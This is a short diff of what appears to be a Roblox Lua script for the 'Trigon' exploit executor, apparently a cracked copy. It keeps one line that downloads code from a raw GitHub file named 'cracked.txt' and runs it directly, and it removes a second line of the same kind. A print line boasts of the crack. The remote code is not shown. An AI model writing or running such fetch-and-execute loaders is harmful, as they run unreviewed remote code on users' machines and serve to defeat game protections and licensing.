@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/cracked.txt", true))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/ata8.txt", true))()
-
 print("Trigon | Executor, I fucked This Executor, I'm sorry")
 
 function genStr(minL, maxL)
